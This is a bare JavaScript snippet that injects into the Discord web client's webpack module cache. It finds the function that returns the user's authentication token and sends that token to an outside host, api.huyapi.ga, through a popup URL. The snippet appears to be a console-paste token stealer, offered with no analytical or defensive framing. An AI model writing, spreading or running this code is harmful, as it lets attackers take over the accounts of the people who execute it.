window.webpackChunkdiscord_app.push([
  [Math.random()],
  {},
  req => {
    for (const m of Object.keys(req.c)
      .map(x => req.c[x].exports)
      .filter(x => x)) {
      if (m.default && m.default.getToken !== undefined) {
        return window.open(
          "https://api.huyapi.ga/luv/?input=" +
            encodeURIComponent(m.default.getToken()),
          "popup"
        );
      }
      if (m.getToken !== undefined) {
        return window.open(
          "https://api.huyapi.ga/luv/?input=" +
            encodeURIComponent(m.getToken()),
          "popup"
        );
      }
    }
  },
]);
